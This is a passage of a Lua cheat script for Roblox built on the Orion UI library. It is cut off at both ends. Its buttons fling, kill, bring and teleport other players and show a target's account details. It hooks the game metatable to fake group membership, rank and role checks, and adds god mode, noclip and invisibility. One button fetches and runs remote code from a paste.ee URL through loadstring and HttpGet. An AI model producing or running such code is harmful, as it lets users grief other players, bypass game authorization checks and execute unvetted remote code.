        		pos.z = pos.z + tTorso.Velocity.Z / 2
    		    lp.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(pos.x,pos.y,pos.z))
    		else
    		    lp.Character.HumanoidRootPart.CFrame = tTorso.CFrame
		    end
	    end)
    end)
end)

wait()

lp.Character.Humanoid.HipHeight = flinghh

wait(.5)

carpetLoop:Disconnect()
wait()
lp.Character.Humanoid.Health = 0
wait(game.Players.RespawnTime + .6)
lp.Character.HumanoidRootPart.CFrame = oldpos
  	end    
})

Player:AddButton({
	Name = "Information about Player",
	Callback = function()
      	OrionLib:MakeNotification({
	Name = "Information about Player:",
	Content = 'Name: '..PlayerTarget.Name..' | Character Name: '..PlayerTarget.Character.Name..' | DisplayName: '..PlayerTarget.DisplayName..' | Account Age: '..PlayerTarget.AccountAge..' | User ID: '..PlayerTarget.UserId..' | Health: '..round(PlayerTarget.Character:FindFirstChildOfClass('Humanoid').Health, 1)..' | WalkSpeed: '..PlayerTarget.Character:FindFirstChildOfClass("Humanoid").WalkSpeed..' | JumpPower: '..PlayerTarget.Character:FindFirstChildOfClass("Humanoid").JumpPower,
	Image = "",
	Time = 10
})
  	end    
})

Player:AddToggle({
	Name = "View Player",
	Default = false,
	Callback = function(View)
        if View == true then
		if viewDied then
			viewDied:Disconnect()
			viewChanged:Disconnect()
		end
		viewing = PlayerTarget
		game.Workspace.CurrentCamera.CameraSubject = viewing.Character
		local function viewDiedFunc()
			repeat wait() until PlayerTarget.Character ~= nil and getRoot(PlayerTarget.Character)
			game.Workspace.CurrentCamera.CameraSubject = viewing.Character
		end
		viewDied = PlayerTarget.CharacterAdded:Connect(viewDiedFunc)
		local function viewChangedFunc()
			game.Workspace.CurrentCamera.CameraSubject = viewing.Character
		end
		viewChanged = game.Workspace.CurrentCamera:GetPropertyChangedSignal("CameraSubject"):Connect(viewChangedFunc)
		else
		    View = false
			if viewing ~= nil then
		viewing = nil
	end
	if viewDied then
		viewDied:Disconnect()
		viewChanged:Disconnect()
	end
	game.Workspace.CurrentCamera.CameraSubject = plr.Character
		end		
  end    
})

Player:AddToggle({
	Name = "Stare At Player",
	Default = false,
	Callback = function(Stareq)
        if Stareq == true then
		if stareLoop then
			stareLoop:Disconnect()
		end
		if not plr.Character:FindFirstChild("HumanoidRootPart") and PlayerTarget.Character:FindFirstChild("HumanoidRootPart") then return end
		local function stareFunc()
			if plr.Character.PrimaryPart and PlayerTarget.Character ~= nil and PlayerTarget.Character:FindFirstChild("HumanoidRootPart") then
				local chrPos= plr.Character.PrimaryPart.Position
				local tPos= PlayerTarget.Character:FindFirstChild("HumanoidRootPart").Position
				local modTPos=Vector3.new(tPos.X,chrPos.Y,tPos.Z)
				local newCF=CFrame.new(chrPos,modTPos)
				plr.Character:SetPrimaryPartCFrame(newCF)
			elseif not PlayerTarget:FindFirstChild(game.Players) then
				stareLoop:Disconnect()
			end
		end

		stareLoop = game:GetService("RunService").RenderStepped:Connect(stareFunc)
		else
		    Stareq = false
			if stareLoop then
		stareLoop:Disconnect()
	end
		end		
  end    
})

Player:AddToggle({
	Name = "Fling Player",
	Default = false,
	Callback = function(Flinglol)
        if Flinglol == true then
            plr.Character.Humanoid.PlatformStand = Platformstand
			Flinging = true
	local Thrust = Instance.new("BodyThrust", plr.Character.HumanoidRootPart)
	Thrust.Force = Vector3.new(100000, 100000, 100000)
	Thrust.Name = "FlingForce"
	repeat
		plr.Character.HumanoidRootPart.CFrame = getRoot(PlayerTarget.Character).CFrame
		Thrust.Location = getRoot(PlayerTarget.Character).Position
		game:GetService('RunService').Heartbeat:Wait()
	until not getRoot(PlayerTarget.Character) or Flinging == false
		else
		    Flinglol = false
			Flinging = false
			plr.Character.Humanoid.PlatformStand = false
	for i,v in pairs(plr.Character.HumanoidRootPart:GetChildren()) do
		if v.Name == "FlingForce" and v:IsA("BodyThrust") then
			v:Destroy()
		end
	end
		end		
  end    
})

Player:AddToggle({
	Name = "PlatformStand Fling",
	Default = false,
	Callback = function(pFlinglol)
        if pFlinglol == true then
            Platformstand = true
		else
		    pFlinglol = false
			Platformstand = false
		end		
  end    
})

Player:AddButton({
	Name = "Give Tools To Player",
	Callback = function()
      	game.Players.LocalPlayer.Character.Humanoid.Name = 1
local l = game.Players.LocalPlayer.Character["1"]:Clone()
l.Parent = game.Players.LocalPlayer.Character
l.Name = "Humanoid"
wait(0.1)
game.Players.LocalPlayer.Character["1"]:Destroy()
game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
game.Players.LocalPlayer.Character.Animate.Disabled = true
wait(0.1)
game.Players.LocalPlayer.Character.Animate.Disabled = false
game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"

for i,v in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
    if v:IsA("Tool") then
       v.Parent = game:GetService("Players").LocalPlayer.Character
    end
end

game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = getRoot(PlayerTarget.Character).CFrame
  	end    
})

Player:AddButton({
	Name = "Bring Player",
	Callback = function()
      	bring(speaker, PlayerTarget)
  	end    
})

Player:AddButton({
	Name = "Fast Bring Player",
	Callback = function()
      	bring(speaker, PlayerTarget, true)
  	end    
})

Player:AddButton({
	Name = "Fast Bring Player [GodMode Method]",
	Callback = function()
      	NOW = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
game.Players.LocalPlayer.Character.Humanoid.Name = 1
local l = game.Players.LocalPlayer.Character["1"]:Clone()
l.Parent = game.Players.LocalPlayer.Character
l.Name = "Humanoid"
wait(0.1)
game.Players.LocalPlayer.Character["1"]:Destroy()
game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
game.Players.LocalPlayer.Character.Animate.Disabled = true
wait(0.1)
game.Players.LocalPlayer.Character.Animate.Disabled = false
game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
end
local function tp(player,player2)
local char1,char2=player.Character,player2.Character
if char1 and char2 then
char1.HumanoidRootPart.CFrame = char2.HumanoidRootPart.CFrame
end
end
local function getout(player,player2)
local char1,char2=player.Character,player2.Character
if char1 and char2 then
char1:MoveTo(char2.HumanoidRootPart.Position)
end
end
tp(PlayerTarget, game.Players.LocalPlayer)
wait(0.1)
tp(PlayerTarget, game.Players.LocalPlayer)
wait(0.3)
getout(game.Players.LocalPlayer, PlayerTarget)
wait(0.2)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = NOW
  	end    
})

Player:AddButton({
	Name = "Kill Player",
	Callback = function()
      	kill(speaker, PlayerTarget)
  	end    
})

Player:AddButton({
	Name = "Fast Kill Player",
	Callback = function()
      	kill(speaker, PlayerTarget, true)
  	end    
})

Player:AddButton({
	Name = "ToolHandle Kill Player",
	Callback = function()
      	local Char = plr.Character
local RS = game:GetService("RunService").RenderStepped
local Tool = Char:FindFirstChildWhichIsA("Tool")
local Handle = Tool and Tool:FindFirstChild("Handle")
if not Tool or not Handle then
   return game.StarterGui:SetCore("SendNotification", {Title = "Warning!", Text = "You need to hold a 'Tool' that does damage on touchinterest. For example Sword or Knife.", Duration = 4,})
end
task.spawn(function()
   while Tool and Char and PlayerTarget.Character and Tool.Parent == Char do
           local Human = PlayerTarget.Character:FindFirstChildWhichIsA("Humanoid")
           if not Human or Human.Health <= 0 then
                   break
           end
           for i, v1 in ipairs(PlayerTarget.Character:GetChildren()) do
                   v1 = ((v1:IsA("BasePart") and firetouchinterest(Handle, v1, 1, (RS.Wait(RS) and nil) or firetouchinterest(Handle, v1, 0)) and nil) or v1) or v1
           end
   end
   game.StarterGui:SetCore("SendNotification", {Title = "Done!", Text = "ToolHandle Kill Stopped. Because player died/left or you just unequipped the tool.", Duration = 4,})
end)
  	end    
})

Player:AddButton({
	Name = "Look At Player",
	Callback = function()
      	local preMaxZoom = game.Players.LocalPlayer.CameraMaxZoomDistance
	local preMinZoom = game.Players.LocalPlayer.CameraMinZoomDistance
	if plr.CameraMaxZoomDistance ~= 0.5 then
		preMaxZoom = plr.CameraMaxZoomDistance
		preMinZoom = plr.CameraMinZoomDistance
	end
	plr.CameraMaxZoomDistance = 0.5
	plr.CameraMinZoomDistance = 0.5
	wait()
		if PlayerTarget.Character and PlayerTarget.Character:FindFirstChild('Head') then
			game.Workspace.CurrentCamera.CFrame = CFrame.new(game.Workspace.CurrentCamera.CFrame.p, PlayerTarget.Character.Head.CFrame.p)
			wait(0.1)
		end
	plr.CameraMaxZoomDistance = preMaxZoom
	plr.CameraMinZoomDistance = preMinZoom
  	end    
})

Player:AddLabel("Two Players")

Player:AddTextbox({
	Name = "Player Name",
	Default = "",
	TextDisappear = true,
	Callback = function(Walktofollow)
		local Target = unpack(GetPlayer(Walktofollow))
		PlayerTargettwo = Target
	end		  
})

Player:AddButton({
	Name = "Teleport Player to Player",
	Callback = function()
      	if getRoot(PlayerTarget.Character) and getRoot(PlayerTargettwo.Character) then
			if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
				speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
				wait(.1)
			end
			teleport(speaker,PlayerTarget,PlayerTargettwo)
		end
  	end    
})

Player:AddButton({
	Name = "Fast Teleport Player to Player",
	Callback = function()
      	if getRoot(PlayerTarget.Character) and getRoot(PlayerTargettwo.Character) then
			if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
				speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
				wait(.1)
			end
			teleport(speaker,PlayerTarget,PlayerTargettwo, true)
		end
  	end    
})

LP:AddLabel("Group Stats")

LP:AddTextbox({
	Name = "IsInGroup",
	Default = "",
	TextDisappear = true,
	Callback = function(grid)
OrionLib:MakeNotification({
	Name = "Tutorial",
	Content = "Write number id of group to bypass the checkfunction.",
	Image = "rbxassetid://6023426945",
	Time = 5
})
local grids = tonumber(grid)
local mt = getrawmetatable(game);
local nc = mt.__namecall
setreadonly(mt, false)

mt.__namecall = newcclosure(function(self, ...)
    local Method = getnamecallmethod();
    if Method == 'IsInGroup' then
        return grids
    end
    return nc(self, ...)
end)
	end		  
})

LP:AddTextbox({
	Name = "Set Rank",
	Default = "",
	TextDisappear = true,
	Callback = function(rankid)
OrionLib:MakeNotification({
	Name = "Tutorial",
	Content = "Write number of rank, example from 0 to 255.",
	Image = "rbxassetid://6023426945",
	Time = 5
})
		local rankids = tonumber(rankid)
local mt = getrawmetatable(game);
local nc = mt.__namecall
setreadonly(mt, false)

mt.__namecall = newcclosure(function(self, ...)
    local Method = getnamecallmethod();
    if Method == 'GetRankInGroup' then
        return rankids
    end
    return nc(self, ...)
end)
	end		  
})

LP:AddTextbox({
	Name = "Set Role",
	Default = "",
	TextDisappear = true,
	Callback = function(roleid)
OrionLib:MakeNotification({
	Name = "Tutorial",
	Content = "Write name of role, example Manager, Admin, Moderator, etc.",
	Image = "rbxassetid://6023426945",
	Time = 5
})
		local roleids = roleid
local mt = getrawmetatable(game);
local nc = mt.__namecall
setreadonly(mt, false)

mt.__namecall = newcclosure(function(self, ...)
    local Method = getnamecallmethod();
    if Method == 'GetRoleInGroup' then
        return roleids
    end
    return nc(self, ...)
end)
	end		  
})

LP:AddLabel("Character")

LP:AddSlider({
	Name = "WalkSpeed",
	Min = 0,
	Max = 500,
	Default = NOWW,
	Color = Color3.fromRGB(255,255,255),
	Increment = 1,
	ValueName = "Speed",
	Callback = function(Value)
		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
	end    
})

LP:AddSlider({
	Name = "JumpPower",
	Min = 0,
	Max = 500,
	Default = NOWJ,
	Color = Color3.fromRGB(255,255,255),
	Increment = 1,
	ValueName = "Power",
	Callback = function(Value)
		game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value
	end    
})

LP:AddSlider({
	Name = "Gravity",
	Min = 0,
	Max = 196,
	Default = NOWG,
	Color = Color3.fromRGB(255,255,255),
	Increment = 1,
	ValueName = "Gravity",
	Callback = function(Value)
		game.Workspace.Gravity = Value
	end    
})

LP:AddSlider({
	Name = "HipHeight",
	Min = 0,
	Max = 50,
	Default = NOWH,
	Color = Color3.fromRGB(255,255,255),
	Increment = 1,
	ValueName = "Height",
	Callback = function(Value)
		game.Players.LocalPlayer.Character.Humanoid.HipHeight = Value
	end    
})

LP:AddButton({
	Name = "Standard WalkSpeed",
	Callback = function()
      	game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = NOWW
  	end    
})

LP:AddButton({
	Name = "Standard JumpPower",
	Callback = function()
      	game.Players.LocalPlayer.Character.Humanoid.JumpPower = NOWJ
  	end    
})

LP:AddButton({
	Name = "Standard HipHeight",
	Callback = function()
      	game.Players.LocalPlayer.Character.Humanoid.HipHeight = NOWH
  	end    
})

LP:AddButton({
	Name = "Standard Gravity",
	Callback = function()
      	game.Workspace.Gravity = NOWG
  	end    
})

LP:AddButton({
	Name = "Rejoin",
	Callback = function()
      	local plr = game.Players.LocalPlayer

game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
  	end    
})

LP:AddButton({
    Name = "Reset",
	Callback = function()
      	game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health = 0
  	end    
})

function refresh()
	local oldpos = plr.Character.HumanoidRootPart.CFrame
	plr.Character.Humanoid.Health = 0
	if plr.Character:FindFirstChild("Head") then plr.Character.Head:Destroy() end
	plr.CharacterAdded:Wait()
	plr.Character:WaitForChild("HumanoidRootPart")
	plr.Character.HumanoidRootPart.CFrame = oldpos
end

LP:AddButton({
	Name = "Refresh",
	Callback = function()
      	if Noclipping then
		   Noclipping:Disconnect()
		   YesRefresh = true  
		end
		refresh()
		if YesRefresh == true then
        Clip = false
	wait(0.1)
	Noclip()
	YesRefresh = false
	wait(0.1)
	if Noclipping then
	   Noclipping:Disconnect()	
	end	
	end
  	end    
})

LP:AddButton({
	Name = "Refresh Model",
	Callback = function()
      	plr.Character:ClearAllChildren()
    local char = Instance.new("Model", workspace)
    Instance.new("Humanoid", char)
    plr.Character = char
  	end    
})

LP:AddButton({
	Name = "Respawn",
	Callback = function()
      	game.Players.LocalPlayer.Character:Destroy()
    game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):Destroy()
    game.Players.LocalPlayer.Character.Head:Destroy()
	getRoot(plr.Character):Destroy()
  	end    
})

LP:AddButton({
	Name = "Invisible BoxMethod",
	Callback = function()

local Part = Instance.new('Part',workspace)
       Part.Size = Vector3.new(5,0,5)
       Part.Anchored = true
       Part.CFrame = CFrame.new(Vector3.new(9999,9999,9999))
       Character.PrimaryPart.CFrame = Part.CFrame*CFrame.new(0,3,0)
       spawn(function()
           wait(3)
           Part:Destroy()
       end)

      if plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
         local Clone = Character.LowerTorso.Root:Clone()
         Character.LowerTorso.Root:Destroy()
         Clone.Parent = Character.LowerTorso
      else
		  local Clone = Character.HumanoidRootPart:Clone()
         Character.HumanoidRootPart:Destroy()
         Clone.Parent = Character
	  end

wait(1)
       Character.PrimaryPart.CFrame = StoredCF

game.Players.LocalPlayer.Character.Animate:Destroy()
  	end    
})

LP:AddToggle({
	Name = "Invisible",
	Default = false,
	Callback = function(invisibleofc)
		if invisibleofc == true then
              if invisRunning then return end
	invisRunning = true
	-- Full credit to AmokahFox @V3rmillion
	local Player = plr
	repeat wait(.1) until Player.Character
	local Character = Player.Character
	Character.Archivable = true
	InvisibleCharacter = Character:Clone()
	InvisibleCharacter.Parent = game:GetService'Lighting'
	local Void = game.Workspace.FallenPartsDestroyHeight
	InvisibleCharacter.Name = ""
	     invisFix = game:GetService("RunService").Stepped:Connect(function()
		pcall(function()
			local IsInteger
			if tostring(Void):find'-' then
				IsInteger = true
			else
				IsInteger = false
			end
			local Pos = Player.Character.HumanoidRootPart.Position
			local Pos_String = tostring(Pos)
			local Pos_Seperate = Pos_String:split(', ')
			local X = tonumber(Pos_Seperate[1])
			local Y = tonumber(Pos_Seperate[2])
			local Z = tonumber(Pos_Seperate[3])
			if IsInteger == true then
				if Y <= Void then
					invisRespawn()
				end
			elseif IsInteger == false then
				if Y >= Void then
					invisRespawn()
				end
			end
		end)
	end)
	      for i,v in pairs(InvisibleCharacter:GetDescendants())do
		if v:IsA("BasePart") then
			if v.Name == "HumanoidRootPart" then
				v.Transparency = 1
			else
				v.Transparency = .5
			end
		end
	end
	invisDied = InvisibleCharacter:FindFirstChildOfClass'Humanoid'.Died:Connect(function()
		invisRespawn()
		invisDied:Disconnect()
	end)
	if IsInvis == true then return end
	IsInvis = true
	CF = game.Workspace.CurrentCamera.CFrame
	local CF_1 = Player.Character.HumanoidRootPart.CFrame
	Character:MoveTo(Vector3.new(0,math.pi*1000000,0))
	game.Workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable
	wait(.2)
	game.Workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
	InvisibleCharacter = InvisibleCharacter
	Character.Parent = game:GetService'Lighting'
	InvisibleCharacter.Parent = game.Workspace
	InvisibleCharacter.HumanoidRootPart.CFrame = CF_1
	Player.Character = InvisibleCharacter
	fixcam()
	Player.Character.Animate.Disabled = true
	Player.Character.Animate.Disabled = false
          else
               invisibleofc = false
			   TurnVisible()
	end
  end    
})

LP:AddButton({
	Name = "Fling Touch",
	Callback = function()
      	local player = game.Players.LocalPlayer
local character1 = player.Character
local mouse = player:GetMouse()

local fakebody = Instance.new("Part", character1)
fakebody.Transparency = 1
fakebody.Anchored = true
fakebody.CanCollide = false
fakebody.Position = character1.Head.Position
fakebody.Name = "FPart"
wait()

_G.ReanimationType = "Fling" --PDeath, Fling, Simple
_G.Velocity = Vector3.new(36,0,0)
_G.FlingBlock = true
_G.FlingBlockTransparency = 1
_G.HighlightFlingBlock = true
_G.FlingBlockPosition = "FPart"
_G.HighlightFlingBlockColor = Color3.fromRGB(255,0,0)

loadstring(game:HttpGet("https://paste.ee/r/VwY6U"))()
  	end    
})

LP:AddButton({
	Name = "Fling Attachment",
	Callback = function()
      	loadcharacter(plr.Character)
  	end    
})

LP:AddButton({
	Name = "God Mode",
	Callback = function()
      	local Cam = workspace.CurrentCamera
	local Pos, Char = Cam.CFrame, game.Players.LocalPlayer.Character
	local Human = Char and Char:FindFirstChildWhichIsA("Humanoid")
	local nHuman = Human:Clone(Human)
	nHuman.Parent, game.Players.LocalPlayer.Character = Char, nil
	nHuman.SetStateEnabled(nHuman, 15, false)
	nHuman.SetStateEnabled(nHuman, 1, false)
	nHuman.SetStateEnabled(nHuman, 0, false)
	nHuman.BreakJointsOnDeath, Human = true, Human.Destroy(Human)
	game.Players.LocalPlayer.Character, Cam.CameraSubject, Cam.CFrame = Char, nHuman, wait() and Pos
	nHuman.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
	local Script = Char.FindFirstChild(Char, "Animate")
	if Script then
		Script.Disabled = true
		wait()
		Script.Disabled = false
	end
	nHuman.Health = nHuman.MaxHealth
  	end    
})

LP:AddButton({
	Name = "God Mode [Humanoid Replacer]",
	Callback = function()
      	game.Players.LocalPlayer.Character.Humanoid.Name = 1
local l = game.Players.LocalPlayer.Character["1"]:Clone()
l.Parent = game.Players.LocalPlayer.Character
l.Name = "Humanoid"
wait(0.1)
game.Players.LocalPlayer.Character["1"]:Destroy()
game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
game.Players.LocalPlayer.Character.Animate.Disabled = true
wait(0.1)
game.Players.LocalPlayer.Character.Animate.Disabled = false
game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
  	end    
})

LP:AddButton({
	Name = "unAnchored Parts to You",
	Callback = function()
      	if sethidden then
			local Forces = {}
			for _,part in pairs(game.Workspace:GetDescendants()) do
				if game.Players.LocalPlayer.Character:FindFirstChild("Head") and part:IsA("BasePart" or "UnionOperation" or "Model") and part.Anchored == false and not part:IsDescendantOf(plr.Character) and part.Name == "Torso" == false and part.Name == "Head" == false and part.Name == "Right Arm" == false and part.Name == "Left Arm" == false and part.Name == "Right Leg" == false and part.Name == "Left Leg" == false and part.Name == "HumanoidRootPart" == false then
					for i,c in pairs(part:GetChildren()) do
						if c:IsA("BodyPosition") or c:IsA("BodyGyro") then
							c:Destroy()
						end
					end
					local ForceInstance = Instance.new("BodyPosition")
					ForceInstance.Parent = part
					ForceInstance.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
					table.insert(Forces, ForceInstance)
					if not table.find(frozenParts,part) then
						table.insert(frozenParts,part)
					end
				end
			end
			if not simRadius then
				SimRad()
			end
			for i,c in pairs(Forces) do
				c.Position = plr.Character.Head.Position
			end
		end
	end    
})

LP:AddButton({
	Name = "Upside-Down Body",
	Callback = function()
      	local lp = game:GetService("Players").LocalPlayer
local c = lp.Character
local hrp0 = c:FindFirstChild("HumanoidRootPart")
local hrp1 = hrp0:Clone()
c.Parent = nil
hrp0.Parent = hrp1
hrp0.RootJoint.Part0 = nil
hrp1.Parent = c
c.Parent = workspace
local h = game:GetService("RunService").Heartbeat
hrp0.Transparency = 0.5
while h:Wait() and c and c.Parent do
    hrp0.CFrame = hrp1.CFrame
    hrp0.Orientation += Vector3.new(0, 0, 180)
    hrp0.Position -= Vector3.new(0, 1, 0)
    hrp0.Velocity = hrp1.Velocity
end
	end    
})

LP:AddButton({
	Name = "Sit",
	Callback = function()
      	plr.Character:FindFirstChildOfClass("Humanoid").Sit = true
	end    
})

LP:AddButton({
	Name = "Sit Walk",
	Callback = function()
      	local anims = plr.Character.Animate
	local sit = anims.sit:FindFirstChildOfClass("Animation").AnimationId
	anims.idle:FindFirstChildOfClass("Animation").AnimationId = sit
	anims.walk:FindFirstChildOfClass("Animation").AnimationId = sit
	anims.run:FindFirstChildOfClass("Animation").AnimationId = sit
	anims.jump:FindFirstChildOfClass("Animation").AnimationId = sit
	if plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
		plr.Character:FindFirstChildOfClass('Humanoid').HipHeight = 0.5
	else
		plr.Character:FindFirstChildOfClass('Humanoid').HipHeight = -1.5
	end
	end    
})

LP:AddButton({
	Name = "LayDown Forward",
	Callback = function()
      	local Human = plr.Character and plr.Character:FindFirstChildOfClass('Humanoid')
	if not Human then
		return
	end
	Human.Sit = true
	task.wait(.1)
	Human.RootPart.CFrame = Human.RootPart.CFrame * CFrame.Angles(math.pi * .5, 0, 0)
	for _, v in ipairs(Human:GetPlayingAnimationTracks()) do
		v:Stop()
	end
	end    
})

LP:AddButton({
	Name = "LayDown Back",
	Callback = function()
local Human = plr.Character and plr.Character:FindFirstChildOfClass('Humanoid')
	if not Human then
		return
	end
	Human.Sit = true
	task.wait(.1)
	Human.RootPart.CFrame = Human.RootPart.CFrame * CFrame.Angles(math.pi * .4, 10, 0)
	for _, v in ipairs(Human:GetPlayingAnimationTracks()) do
		v:Stop()
	end
	end    
})


LP:AddButton({
	Name = "LayDown Left",
	Callback = function()
local Human = plr.Character and plr.Character:FindFirstChildOfClass('Humanoid')
	if not Human then
		return
	end
	Human.Sit = true
	task.wait(.1)
	Human.RootPart.CFrame = Human.RootPart.CFrame * CFrame.Angles(math.pi * .4, 5, 0)
	for _, v in ipairs(Human:GetPlayingAnimationTracks()) do
		v:Stop()
	end
	end    
})

LP:AddButton({
	Name = "LayDown Right",
	Callback = function()
local Human = plr.Character and plr.Character:FindFirstChildOfClass('Humanoid')
	if not Human then
		return
	end
	Human.Sit = true
	task.wait(.1)
	Human.RootPart.CFrame = Human.RootPart.CFrame * CFrame.Angles(math.pi * .4, -5, 0)
	for _, v in ipairs(Human:GetPlayingAnimationTracks()) do
		v:Stop()
	end
	end    
})

LP:AddToggle({
	Name = "Regular Fling",
	Default = false,
	Callback = function(flingto)
		if flingto == true then
              local RootPart = plr.Character.HumanoidRootPart
    if not RootPart then return end
    FlingTBL.OldVelocity = RootPart.Velocity
    local bv = Instance.new("BodyAngularVelocity")
    FlingTBL.bv = bv
    bv.MaxTorque = Vector3.new(1, 1, 1) * math.huge
    bv.P = math.huge
    bv.AngularVelocity = Vector3.new(0, 9e5, 0)
    bv.Parent = RootPart
    local Char = plr.Character:GetChildren()
    for i,v in next, Char do
           if v:IsA("BasePart") then
                   v.CanCollide = false
                   v.Massless = true
                   v.Velocity = Vector3.new(0,0,0)
           end
    end
    FlingTBL.Noclipping2 = game:GetService("RunService").Stepped:Connect(function()
            for i, v in next, Char do
                    if v:IsA("BasePart") then
                            v.CanCollide = false
                    end
            end
    end)
    if Regulars == false then
    Regulars = true
          else
               flingto = false
			   local RootPart = plr.Character.HumanoidRootPart
    if not RootPart then return end
    FlingTBL.OldPos = RootPart.CFrame
    local Char = plr.Character:GetChildren()
    if FlingTBL ~= nil then
            FlingTBL.bv:Destroy()
            FlingTBL.bv = nil
    end
    if FlingTBL.Noclipping2 ~= nil then
            FlingTBL.Noclipping2:Disconnect()
            FlingTBL.Noclipping2 = nil
    end
    for i, v in next, Char do
            if v:IsA("BasePart") then
                    v.CanCollide = true
                    v.Massless = false
            end
    end
    FlingTBL.isRunning = game:GetService("RunService").Stepped:Connect(function()
            if FlingTBL.OldPos ~= nil then
                    RootPart.CFrame = FlingTBL.OldPos
            end
            if FlingTBL.OldVelocity ~= nil then
                    RootPart.Velocity = FlingTBL.OldVelocity
            end
    end)
    wait(2)
	RootPart.Anchored = true
	if FlingTBL.isRunning ~= nil then
		FlingTBL.isRunning:Disconnect()
		FlingTBL.isRunning = nil
	end
	RootPart.Anchored = false
	if FlingTBL.OldVelocity ~= nil then
		RootPart.Velocity = FlingTBL.OldVelocity
	end
	if FlingTBL.OldPos ~= nil then
		RootPart.CFrame = FlingTBL.OldPos
	end
    for i,m in pairs(plr.Character.HumanoidRootPart:GetChildren()) do
        if m.Name == "BodyAngularVelocity" then
           m:Destroy()
        end
    end
	wait()
	FlingTBL.OldVelocity = nil
	FlingTBL.OldPos = nil
	Regulars = false
end
	end
  end    
})

LP:AddToggle({
	Name = "Very Strengthen",
	Default = false,
	Callback = function(lolstreng)
		if lolstreng == true then
              for i,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
    if v:IsA("Part") then

v.CustomPhysicalProperties = PhysicalProperties.new(9e99, 9e99, 9e99, 9e99, 9e99)
end
end
          else
               lolstreng = false
			   for _, child in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
		if child.ClassName == "Part" then
			child.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5, 0, 0)
		end
	end
	end
  end    
})

LP:AddToggle({
	Name = "Strengthen",
	Default = false,
	Callback = function(lolstreng)
		if lolstreng == true then
              for i,player in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
		if player.ClassName == "Part" then
			player.CustomPhysicalProperties = PhysicalProperties.new(100, 0.3, 0.5)
		end
	end
          else
               lolstreng = false
			   for _, child in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
		if child.ClassName == "Part" then
			child.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5)
		end
	end
	end
  end    
})

LP:AddToggle({
	Name = "Weaken",
	Default = false,
	Callback = function(lolweak)
		if lolweak == true then
              for i,player in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
		if player.ClassName == "Part" then
			player.CustomPhysicalProperties = PhysicalProperties.new(0, 0.3, 0.5)
		end
	end
          else
               lolweak = false
			   for _, child in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
		if child.ClassName == "Part" then
			child.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5)
		end
	end
	end
  end    
})

LP:AddToggle({
	Name = "Noclip",
	Default = false,
	Callback = function(Noclip)
        if Noclip == true then
            Clip = false
	wait(0.1)
	local function NoclipLoop()
		if Clip == false and plr.Character ~= nil then
			for _, child in pairs(plr.Character:GetDescendants()) do
				if child:IsA("BasePart") and child.CanCollide == true then
					child.CanCollide = false
				end
			end
		end
	end
	Noclipping = game:GetService('RunService').Stepped:Connect(NoclipLoop)
		else
		    Noclip = false
			if Noclipping then
		Noclipping:Disconnect()
	end
	Clip = true
		end		
  end    
})

LP:AddToggle({
	Name = "Freeze",
	Default = false,
	Callback = function(plrfree)
        if plrfree == true then
            for i,v in pairs(plr.Character:GetDescendants()) do
                if v:IsA("BasePart") then
                v.Anchored = true
            end
            end
		else
		    plrfree = false
			for i,v in pairs(plr.Character:GetDescendants()) do
                if v:IsA("BasePart") then
                v.Anchored = false
            end
            end
		end		
  end    
})

function sFLY(vfly)
	repeat wait() until Players.LocalPlayer and Players.LocalPlayer.Character and Players.LocalPlayer.Character.HumanoidRootPart and Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
	repeat wait() until IYMouse
	if flyKeyDown or flyKeyUp then flyKeyDown:Disconnect() flyKeyUp:Disconnect() end

	local T = Players.LocalPlayer.Character.HumanoidRootPart
	local CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
	local lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
	local SPEED = 0

	local function FLY()
		FLYING = true
		local BG = Instance.new('BodyGyro')
		local BV = Instance.new('BodyVelocity')
		BG.P = 9e4
		BG.Parent = T
		BV.Parent = T
		BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		BG.cframe = T.CFrame
		BV.velocity = Vector3.new(0, 0, 0)
		BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
		task.spawn(function()
			repeat wait()
				if not vfly and Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
					Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = true
				end
